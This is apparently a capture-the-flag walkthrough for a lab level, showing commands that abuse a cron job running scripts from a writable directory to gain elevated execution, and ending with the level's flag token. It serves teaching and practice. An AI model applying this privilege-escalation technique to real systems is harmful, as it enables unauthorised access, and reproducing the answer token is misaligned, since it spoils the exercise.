# Level05 Walkthrough

## Overview

This level involves abusing a cron job that executes scripts from a writable directory. By placing a malicious script in that location, we can execute commands with elevated privileges.

## Walkthrough

### 1. Inspect mail for hints

Check the system mail to discover scheduled tasks:

```bash id="a1z9qp"
cat /var/mail/level05
```

This reveals a cron job executing scripts from:

```
/opt/openarenaserver/
```

### 2. Prepare the exploit

Navigate to the directory and create a script that runs `getflag`:

```bash id="b7x2lm"
cd /opt/openarenaserver/
echo 'getflag > /tmp/flag05' > getflag.sh
```

### 3. Wait for execution

* The cron job runs periodically (about every 2 minutes).
* It will automatically execute the script you placed.

### 4. Retrieve the flag

After the cron job runs:

```bash id="c4v8rt"
cat /tmp/flag05
```

## Token

```text id="d9k3ws"
viuaaale9huek52boumoomioc
```

